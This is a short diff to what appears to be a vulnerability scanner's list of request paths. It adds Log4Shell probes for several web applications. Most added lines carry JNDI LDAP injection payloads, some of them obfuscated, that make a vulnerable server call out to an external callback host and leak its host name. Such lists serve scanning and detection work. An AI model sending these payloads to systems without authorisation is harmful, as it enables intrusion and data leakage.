@@ -4,3 +4,8 @@
 /api/geojson?url=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}
 /user/error
 /dr/authentication/oauth2/oauth2login?error=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.{{interactsh-url}}%7D
+/decisioncenter-api/v1/about?datasource=ldap://{{interactsh-url}}
+/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost
+/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
+/dr/authentication/oauth2/oauth2login?error=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.uri.{{interactsh-url}}%7D
+/portal/registerServlet
